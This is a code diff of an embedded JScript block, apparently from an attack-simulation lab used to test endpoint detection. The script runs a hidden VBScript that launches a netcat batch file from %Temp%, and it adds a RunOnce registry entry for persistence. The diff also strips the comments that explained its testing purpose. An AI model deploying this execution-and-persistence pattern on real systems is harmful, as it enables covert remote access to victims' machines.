@@ -13,14 +13,11 @@
   	<!-- You can either execute locally, or from a url -->
 	<script language="JScript">
 		<![CDATA[
-	    		// calc.exe should launch, this could be any arbitrary code.
-      	   		// What you are hoping to catch is the cmdline, modloads, or network connections, or any variation
-				
-			//var r = new ActiveXObject("WScript.Shell").Run("C:\\Users\\lab-win10\\Desktop\\simulations\\nc.bat",1,false);	
-			//var r = new ActiveXObject("WScript.Shell").Run("wscript.exe C:\\Users\\lab-win10\\Desktop\\simulations\\sim_1\\hidden.vbs",1,false);	
-//var r = new ActiveXObject("WScript.Shell").Run("%comspec% /c" + "wscript.exe" + "C:\\Users\\lab-win10\\Desktop\\simulations\\sim_1\\hidden.vbs" + "C:\\Users\\lab-win10\\Desktop\\simulations\\nc.bat");
+	    		
 
-var start = new ActiveXObject("WScript.Shell").Run('"C:\\Users\\lab-win10\\Desktop\\simulations\\sim_1\\hidden.vbs "C:\\Users\\lab-win10\\Desktop\\simulations\\nc.bat"',1,false);
+
+//var start = new ActiveXObject("WScript.Shell").Run('"C:\\Users\\lab-win10\\Desktop\\simulations\\sim_1\\hidden.vbs "C:\\Users\\lab-win10\\Desktop\\simulations\\nc.bat"',1,false);
+var start = new ActiveXObject("WScript.Shell").Run('"%Temp%\\hidden.vbs "%Temp%\\nc.bat"',1,false);
 
 var reg_add = new ActiveXObject("WScript.Shell");
 reg_add.RegWrite("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\XSample", '"C:\\Users\\lab-win10\\Desktop\\simulations\\nc.bat"', "REG_SZ");
